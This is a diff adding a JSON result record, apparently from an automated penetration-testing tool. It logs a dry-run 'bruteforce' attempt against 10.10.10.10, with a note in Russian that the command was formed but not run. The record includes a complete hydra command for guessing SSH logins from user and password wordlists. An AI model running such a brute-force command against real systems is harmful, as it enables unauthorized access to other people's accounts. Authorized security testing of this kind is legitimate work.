@@ -1,0 +1,15 @@
+{
+  "target": "10.10.10.10",
+  "vector": "bruteforce",
+  "status": "dry_run",
+  "success": true,
+  "details": "Команда сформирована, выполнение не запускалось.",
+  "artifacts": {
+    "command": "hydra -L data\\wordlists\\users.txt -P data\\wordlists\\passwords.txt -t 4 -s 22 ssh://10.10.10.10"
+  },
+  "evidence": {},
+  "profile": "black_box",
+  "dry_run": true,
+  "sla": null,
+  "matched_vulns": []
+}
